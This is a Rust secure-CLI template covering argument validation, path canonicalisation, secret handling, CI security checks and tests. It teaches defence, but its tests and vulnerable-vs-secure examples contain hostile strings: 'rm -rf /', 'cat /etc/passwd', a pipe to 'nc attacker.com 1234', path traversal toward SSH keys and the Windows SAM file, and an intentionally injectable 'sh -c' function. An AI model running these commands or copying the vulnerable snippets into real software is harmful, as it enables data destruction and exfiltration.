# Rust CLI Security Template

## Overview

This template provides a security-hardened foundation for building command-line interface (CLI) applications in Rust. It focuses on secure argument parsing, input validation, privilege management, and protection against common CLI vulnerabilities like command injection, path traversal, and insecure file operations.

**Target Use Cases:**
- System administration tools
- Developer utilities
- Security-focused CLI applications
- Data processing pipelines
- File manipulation tools

## Project Structure

```
my-cli-tool/
├── Cargo.toml
├── Cargo.lock
├── .cargo/
│   └── config.toml          # Build configuration
├── src/
│   ├── main.rs              # Entry point
│   ├── cli.rs               # CLI argument parsing
│   ├── commands/            # Command implementations
│   │   ├── mod.rs
│   │   ├── init.rs
│   │   └── run.rs
│   ├── config.rs            # Configuration management
│   ├── error.rs             # Error types
│   ├── validators.rs        # Input validation
│   └── security/            # Security utilities
│       ├── mod.rs
│       ├── permissions.rs
│       └── sanitize.rs
├── tests/
│   ├── integration_tests.rs
│   └── security_tests.rs
├── benches/
│   └── cli_bench.rs
├── .github/
│   └── workflows/
│       └── security.yml
├── deny.toml                # cargo-deny configuration
└── README.md
```

## Cargo.toml Template

```toml
[package]
name = "my-cli-tool"
version = "0.1.0"
edition = "2021"
rust-version = "1.92.0"
authors = ["Your Name <you@example.com>"]
license = "MIT OR Apache-2.0"
description = "Security-hardened CLI tool"
repository = "https://github.com/username/my-cli-tool"
keywords = ["cli", "security", "tool"]
categories = ["command-line-utilities"]

[dependencies]
# CLI argument parsing with derive macros
clap = { version = "4.5", features = ["derive", "env", "wrap_help"] }

# Error handling
anyhow = "1.0"
thiserror = "2.0"

# Logging
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }

# Configuration management
config = "0.14"
serde = { version = "1.0", features = ["derive"] }
toml = "0.8"

# File operations
tempfile = "3.12"
walkdir = "2.5"

# Path sanitization
path-clean = "1.0"

# Terminal utilities
console = "0.15"
indicatif = "0.17"

# Security utilities
secrecy = { version = "0.10", features = ["serde"] }
zeroize = "1.8"

# Input validation
regex = "1.11"
validator = { version = "0.18", features = ["derive"] }

[dev-dependencies]
assert_cmd = "2.0"
predicates = "3.1"
tempfile = "3.12"
criterion = "0.5"

[build-dependencies]
# For build-time security checks
rustc_version = "0.4"

[profile.release]
# Security-hardened release profile
strip = true              # Strip symbols
lto = true                # Link-time optimization
codegen-units = 1         # Single codegen unit for optimization
panic = "abort"           # Abort on panic (no unwinding)
overflow-checks = true    # Overflow checks in release

[profile.dev]
overflow-checks = true    # Overflow checks in development

[[bin]]
name = "my-cli-tool"
path = "src/main.rs"

[features]
default = []
# Enable additional security hardening
hardened = []
```

## Security Considerations

### 1. Command Injection Prevention
- Never use `std::process::Command` with user-controlled input without validation
- Always use argument arrays instead of shell strings
- Avoid shell interpretation (`sh -c`)

### 2. Path Traversal Protection
- Validate all file paths before operations
- Canonicalize paths to prevent `../` attacks
- Restrict operations to specific directories

### 3. Privilege Management
- Drop privileges as early as possible
- Never run with unnecessary elevated permissions
- Use `sudo` only when absolutely required

### 4. Input Validation
- Validate all user input (arguments, environment variables, config files)
- Use allowlists instead of denylists
- Sanitize paths, URLs, and shell arguments

### 5. Secret Management
- Never log or print secrets
- Use `secrecy` crate for secret types
- Zeroize secrets from memory when done
- Never store secrets in environment variables or config files

### 6. Error Handling
- Don't leak sensitive information in error messages
- Use structured error types
- Log errors securely

## Required Dependencies

### Core Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `clap` | 4.5+ | Secure CLI argument parsing |
| `anyhow` | 1.0+ | Error handling |
| `thiserror` | 2.0+ | Custom error types |
| `tracing` | 0.1+ | Structured logging |
| `secrecy` | 0.10+ | Secret type wrappers |
| `zeroize` | 1.8+ | Memory zeroing |

### Security Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `validator` | 0.18+ | Input validation |
| `path-clean` | 1.0+ | Path sanitization |
| `regex` | 1.11+ | Pattern matching |

### Testing Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `assert_cmd` | 2.0+ | CLI integration testing |
| `predicates` | 3.1+ | Assertion predicates |
| `tempfile` | 3.12+ | Temporary file testing |

## Code Examples

### Example 1: Secure CLI Argument Parsing

```rust
// src/cli.rs
use clap::{Parser, Subcommand};
use std::path::PathBuf;
use validator::Validate;

#[derive(Parser, Debug)]
#[command(name = "my-cli-tool")]
#[command(about = "A secure CLI tool", long_about = None)]
pub struct Cli {
    /// Configuration file path
    #[arg(short, long, value_name = "FILE")]
    pub config: Option<PathBuf>,

    /// Verbosity level (-v, -vv, -vvv)
    #[arg(short, long, action = clap::ArgAction::Count)]
    pub verbose: u8,

    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    /// Initialize a new project
    Init {
        /// Project name (alphanumeric and hyphens only)
        #[arg(value_parser = validate_project_name)]
        name: String,

        /// Output directory
        #[arg(short, long, default_value = ".")]
        output: PathBuf,
    },
    /// Run the tool
    Run {
        /// Input file
        #[arg(value_name = "FILE")]
        input: PathBuf,

        /// Force overwrite
        #[arg(short, long)]
        force: bool,
    },
}

fn validate_project_name(s: &str) -> Result<String, String> {
    let re = regex::Regex::new(r"^[a-zA-Z0-9-_]+$").unwrap();
    if re.is_match(s) && s.len() <= 64 {
        Ok(s.to_string())
    } else {
        Err(String::from("Project name must be alphanumeric (with hyphens/underscores) and <= 64 chars"))
    }
}
```

### Example 2: Secure Path Validation

```rust
// src/security/sanitize.rs
use anyhow::{Context, Result, bail};
use std::path::{Path, PathBuf};
use path_clean::PathClean;

/// Validate and canonicalize a file path to prevent traversal attacks
pub fn validate_path(path: &Path, base_dir: &Path) -> Result<PathBuf> {
    // Canonicalize the base directory
    let base_dir = base_dir.canonicalize()
        .context("Failed to canonicalize base directory")?;

    // Clean the input path (resolve .. and .)
    let cleaned_path = path.clean();

    // If relative, join with base directory
    let full_path = if cleaned_path.is_relative() {
        base_dir.join(&cleaned_path)
    } else {
        cleaned_path
    };

    // Canonicalize the full path
    let canonical = full_path.canonicalize()
        .context("Failed to canonicalize path")?;

    // Ensure the canonical path is within the base directory
    if !canonical.starts_with(&base_dir) {
        bail!("Path traversal detected: {} is outside base directory", path.display());
    }

    Ok(canonical)
}

/// Validate filename (no path separators)
pub fn validate_filename(filename: &str) -> Result<String> {
    if filename.contains('/') || filename.contains('\\') {
        bail!("Filename cannot contain path separators");
    }
    if filename == "." || filename == ".." {
        bail!("Invalid filename");
    }
    if filename.is_empty() || filename.len() > 255 {
        bail!("Filename must be 1-255 characters");
    }
    Ok(filename.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;

    #[test]
    fn test_path_traversal_prevention() {
        let base_dir = env::current_dir().unwrap();

        // Should fail: attempts to escape base directory
        let result = validate_path(Path::new("../../../etc/passwd"), &base_dir);
        assert!(result.is_err());
    }

    #[test]
    fn test_valid_path() {
        let base_dir = env::current_dir().unwrap();
        let result = validate_path(Path::new("./src/main.rs"), &base_dir);
        assert!(result.is_ok());
    }
}
```

### Example 3: Secure Command Execution

```rust
// src/security/mod.rs
use anyhow::{Context, Result};
use std::process::{Command, Output};
use tracing::debug;

/// Execute a command securely without shell interpretation
pub fn execute_command(program: &str, args: &[&str]) -> Result<Output> {
    // Validate program path (should be absolute or in PATH)
    if program.contains("..") || program.contains('/') && !program.starts_with('/') {
        anyhow::bail!("Invalid program path: {}", program);
    }

    debug!("Executing: {} {:?}", program, args);

    // Execute without shell (no shell injection)
    let output = Command::new(program)
        .args(args)
        .output()
        .context(format!("Failed to execute {}", program))?;

    Ok(output)
}

/// UNSAFE: Example of what NOT to do
#[cfg(feature = "examples-unsafe")]
pub fn execute_command_unsafe(command_string: &str) -> Result<Output> {
    // ⚠️ VULNERABLE TO COMMAND INJECTION
    let output = Command::new("sh")
        .arg("-c")
        .arg(command_string)  // User input directly in shell!
        .output()?;
    Ok(output)
}
```

### Example 4: Secret Handling

```rust
// src/config.rs
use secrecy::{Secret, ExposeSecret};
use serde::{Deserialize, Serialize};
use zeroize::Zeroize;
use anyhow::Result;

#[derive(Debug, Deserialize, Serialize)]
pub struct Config {
    pub database_url: String,

    // Secret fields wrapped in Secret<T>
    #[serde(with = "secret_string")]
    pub api_key: Secret<String>,

    #[serde(with = "secret_string")]
    pub encryption_key: Secret<String>,
}

mod secret_string {
    use secrecy::Secret;
    use serde::{Deserialize, Deserializer, Serializer};

    pub fn serialize<S>(secret: &Secret<String>, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        serializer.serialize_str("***REDACTED***")
    }

    pub fn deserialize<'de, D>(deserializer: D) -> Result<Secret<String>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        Ok(Secret::new(s))
    }
}

impl Config {
    pub fn use_api_key(&self) {
        // Secrets must be explicitly exposed
        let key = self.api_key.expose_secret();
        // Use key...
        // Secret is automatically zeroized when dropped
    }
}

impl Drop for Config {
    fn drop(&mut self) {
        // Explicitly zeroize sensitive data
        // (Secret<T> already handles this, but shown for clarity)
    }
}
```

### Example 5: Input Validation

```rust
// src/validators.rs
use validator::{Validate, ValidationError};
use regex::Regex;

#[derive(Debug, Validate)]
pub struct UserInput {
    #[validate(length(min = 1, max = 100))]
    #[validate(custom = "validate_no_control_chars")]
    pub name: String,

    #[validate(email)]
    pub email: String,

    #[validate(url)]
    pub website: Option<String>,

    #[validate(range(min = 1, max = 65535))]
    pub port: u16,
}

fn validate_no_control_chars(s: &str) -> Result<(), ValidationError> {
    if s.chars().any(|c| c.is_control()) {
        return Err(ValidationError::new("contains_control_chars"));
    }
    Ok(())
}

/// Validate a file extension against an allowlist
pub fn validate_file_extension(path: &std::path::Path, allowed: &[&str]) -> anyhow::Result<()> {
    let extension = path.extension()
        .and_then(|e| e.to_str())
        .ok_or_else(|| anyhow::anyhow!("No file extension"))?;

    if allowed.contains(&extension) {
        Ok(())
    } else {
        anyhow::bail!("File extension '{}' not allowed. Allowed: {:?}", extension, allowed)
    }
}
```

## Common Vulnerabilities

### 1. Command Injection

**Vulnerable Code:**
```rust
// ❌ DANGEROUS
let user_input = "file.txt; rm -rf /";
Command::new("sh")
    .arg("-c")
    .arg(format!("cat {}", user_input))
    .output()?;
```

**Secure Code:**
```rust
// ✅ SAFE
let user_input = "file.txt";
Command::new("cat")
    .arg(user_input)  // Passed as argument, not shell command
    .output()?;
```

### 2. Path Traversal

**Vulnerable Code:**
```rust
// ❌ DANGEROUS
let user_path = "../../../../etc/passwd";
let content = std::fs::read_to_string(user_path)?;
```

**Secure Code:**
```rust
// ✅ SAFE
let user_path = "../../../../etc/passwd";
let base_dir = std::env::current_dir()?;
let safe_path = validate_path(Path::new(user_path), &base_dir)?;
let content = std::fs::read_to_string(safe_path)?;
```

### 3. Insecure Temporary Files

**Vulnerable Code:**
```rust
// ❌ DANGEROUS - predictable temp file name
let temp_path = format!("/tmp/myapp-{}.tmp", std::process::id());
std::fs::write(&temp_path, sensitive_data)?;
```

**Secure Code:**
```rust
// ✅ SAFE - unpredictable temp file with proper permissions
use tempfile::NamedTempFile;
let mut temp_file = NamedTempFile::new()?;
temp_file.write_all(sensitive_data)?;
```

### 4. Environment Variable Injection

**Vulnerable Code:**
```rust
// ❌ DANGEROUS
let user_input = "malicious_value";
std::env::set_var("LD_PRELOAD", user_input);
Command::new("some_program").spawn()?;
```

**Secure Code:**
```rust
// ✅ SAFE - explicit environment, no inheritance
Command::new("some_program")
    .env_clear()  // Clear all environment variables
    .env("SAFE_VAR", "known_value")
    .spawn()?;
```

### 5. Secrets in Logs

**Vulnerable Code:**
```rust
// ❌ DANGEROUS
let api_key = "secret_key_123";
println!("Using API key: {}", api_key);
```

**Secure Code:**
```rust
// ✅ SAFE
let api_key = Secret::new("secret_key_123".to_string());
println!("Using API key: ***REDACTED***");
```

## Testing Strategy

### Unit Tests

```rust
// tests/security_tests.rs
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_path_traversal_blocked() {
        let malicious_paths = vec![
            "../../../etc/passwd",
            "../../.ssh/id_rsa",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ];

        let base_dir = std::env::current_dir().unwrap();
        for path in malicious_paths {
            let result = validate_path(Path::new(path), &base_dir);
            assert!(result.is_err(), "Path traversal not blocked: {}", path);
        }
    }

    #[test]
    fn test_command_injection_prevented() {
        // Test that shell metacharacters don't cause injection
        let malicious_inputs = vec![
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 1234",
        ];

        for input in malicious_inputs {
            // Should fail validation
            let result = validate_filename(input);
            assert!(result.is_err());
        }
    }
}
```

### Integration Tests

```rust
// tests/integration_tests.rs
use assert_cmd::Command;
use predicates::prelude::*;
use tempfile::TempDir;

#[test]
fn test_cli_rejects_invalid_input() {
    let mut cmd = Command::cargo_bin("my-cli-tool").unwrap();
    cmd.arg("init")
        .arg("../../invalid/path")
        .assert()
        .failure()
        .stderr(predicate::str::contains("Invalid"));
}

#[test]
fn test_cli_respects_permissions() {
    let temp_dir = TempDir::new().unwrap();
    let restricted_file = temp_dir.path().join("readonly.txt");
    std::fs::write(&restricted_file, "test").unwrap();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&restricted_file).unwrap().permissions();
        perms.set_mode(0o400); // Read-only
        std::fs::set_permissions(&restricted_file, perms).unwrap();
    }

    let mut cmd = Command::cargo_bin("my-cli-tool").unwrap();
    cmd.arg("run")
        .arg("--input")
        .arg(&restricted_file)
        .arg("--output")
        .arg(temp_dir.path().join("output.txt"))
        .assert()
        .success();
}
```

### Property-Based Testing

```rust
// Add to dev-dependencies:
// proptest = "1.5"

#[cfg(test)]
mod property_tests {
    use proptest::prelude::*;

    proptest! {
        #[test]
        fn test_path_validation_never_panics(s in "\\PC*") {
            let base = std::env::current_dir().unwrap();
            let _ = validate_path(Path::new(&s), &base);
            // Should never panic, only return error
        }

        #[test]
        fn test_filename_validation(s in "[a-zA-Z0-9_-]{1,255}") {
            // Valid filenames should always succeed
            let result = validate_filename(&s);
            assert!(result.is_ok());
        }
    }
}
```

## CI/CD Integration

### GitHub Actions Security Workflow

```yaml
# .github/workflows/security.yml
name: Security Audit

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    # Run daily at 2 AM UTC
    - cron: '0 2 * * *'

env:
  CARGO_TERM_COLOR: always
  RUST_BACKTRACE: 1

jobs:
  security-audit:
    name: Security Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: 1.92.0
          components: clippy

      - name: Cache cargo registry
        uses: actions/cache@v4
        with:
          path: ~/.cargo/registry
          key: ${{ runner.os }}-cargo-registry-${{ hashFiles('**/Cargo.lock') }}

      - name: Install cargo-audit
        run: cargo install cargo-audit --locked

      - name: Install cargo-deny
        run: cargo install cargo-deny --locked

      - name: Run cargo audit
        run: cargo audit

      - name: Run cargo deny
        run: cargo deny check

      - name: Run Clippy security lints
        run: cargo clippy -- -W clippy::all -W clippy::cargo -W clippy::pedantic

      - name: Check for unsafe code
        run: |
          if grep -r "unsafe" src/; then
            echo "⚠️ Unsafe code detected - requires manual review"
            exit 1
          fi

  test:
    name: Test Suite
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        rust: [stable, 1.92.0]
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: ${{ matrix.rust }}

      - name: Run tests
        run: cargo test --all-features

      - name: Run security tests
        run: cargo test --test security_tests

  coverage:
    name: Code Coverage
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          toolchain: 1.92.0
          components: llvm-tools-preview

      - name: Install cargo-llvm-cov
        run: cargo install cargo-llvm-cov

      - name: Generate coverage
        run: cargo llvm-cov --all-features --lcov --output-path lcov.info

      - name: Upload to codecov.io
        uses: codecov/codecov-action@v4
        with:
          files: lcov.info
          fail_ci_if_error: true
```

### cargo-deny Configuration

```toml
# deny.toml
[advisories]
vulnerability = "deny"
unmaintained = "warn"
yanked = "deny"
notice = "warn"

[licenses]
unlicensed = "deny"
allow = [
    "MIT",
    "Apache-2.0",
    "BSD-3-Clause",
]
deny = [
    "GPL-3.0",
    "AGPL-3.0",
]

[bans]
multiple-versions = "warn"
wildcards = "deny"
deny = [
    # Insecure random number generation
    { name = "rand", version = "<0.8" },
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
```

## Best Practices

### 1. Argument Parsing
- ✅ Use `clap` with derive macros for type-safe parsing
- ✅ Validate all inputs at the boundary
- ✅ Use value parsers for custom validation
- ✅ Provide clear error messages

### 2. File Operations
- ✅ Always validate and canonicalize paths
- ✅ Use `tempfile` for temporary files
- ✅ Check file permissions before operations
- ✅ Handle symlinks explicitly
- ✅ Use atomic file operations when possible

### 3. Secrets Management
- ✅ Use `secrecy` crate for secret types
- ✅ Zeroize secrets when done
- ✅ Never log or print secrets
- ✅ Use environment variables or secure config files
- ✅ Never commit secrets to version control

### 4. Error Handling
- ✅ Use `anyhow` for application errors
- ✅ Use `thiserror` for library errors
- ✅ Don't leak sensitive information in errors
- ✅ Log errors with appropriate severity
- ✅ Provide actionable error messages

### 5. Logging
- ✅ Use structured logging (`tracing`)
- ✅ Sanitize logs (no secrets, no PII)
- ✅ Use appropriate log levels
- ✅ Include request IDs for correlation
- ✅ Rotate log files

### 6. Dependencies
- ✅ Use `cargo-audit` in CI/CD
- ✅ Use `cargo-deny` for license/security checks
- ✅ Pin dependency versions in applications
- ✅ Regularly update dependencies
- ✅ Review transitive dependencies

### 7. Testing
- ✅ Test security-critical paths
- ✅ Test error conditions
- ✅ Use property-based testing for validators
- ✅ Test on multiple platforms
- ✅ Include integration tests

### 8. Release Builds
- ✅ Enable LTO and optimization
- ✅ Strip symbols
- ✅ Enable overflow checks
- ✅ Use `panic = "abort"`
- ✅ Test release builds

## Example Projects

### Open Source Examples

1. **ripgrep** (by BurntSushi)
   - Repository: https://github.com/BurntSushi/ripgrep
   - Fast, secure grep alternative
   - Excellent input validation and error handling

2. **bat** (by sharkdp)
   - Repository: https://github.com/sharkdp/bat
   - Cat clone with syntax highlighting
   - Good example of safe file operations

3. **fd** (by sharkdp)
   - Repository: https://github.com/sharkdp/fd
   - Find alternative
   - Excellent path handling and validation

4. **tokei** (by XAMPPRocky)
   - Repository: https://github.com/XAMPPRocky/tokei
   - Code statistics tool
   - Good example of parallel file processing

5. **starship** (by starship)
   - Repository: https://github.com/starship/starship
   - Cross-shell prompt
   - Excellent configuration management

### Security-Focused CLI Tools

1. **cargo-audit**
   - Repository: https://github.com/rustsec/rustsec
   - Security audit for Rust dependencies

2. **cargo-deny**
   - Repository: https://github.com/EmbarkStudios/cargo-deny
   - Dependency graph linting

3. **cargo-geiger**
   - Repository: https://github.com/geiger-rs/cargo-geiger
   - Unsafe code detection

## Additional Resources

### Documentation
- [Clap Security Best Practices](https://docs.rs/clap/latest/clap/)
- [Rust CLI Working Group](https://rust-cli.github.io/book/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

### Tools
- `cargo-audit`: Vulnerability scanning
- `cargo-deny`: Dependency linting
- `cargo-geiger`: Unsafe code detection
- `cargo-bloat`: Binary size analysis

### Security Checklists
- [ ] All user input validated at boundaries
- [ ] No command injection vulnerabilities
- [ ] No path traversal vulnerabilities
- [ ] Secrets properly managed (no logs, zeroized)
- [ ] Error messages don't leak sensitive info
- [ ] File permissions checked before operations
- [ ] Temporary files created securely
- [ ] Dependencies audited (cargo-audit)
- [ ] No unnecessary unsafe code
- [ ] CI/CD includes security checks
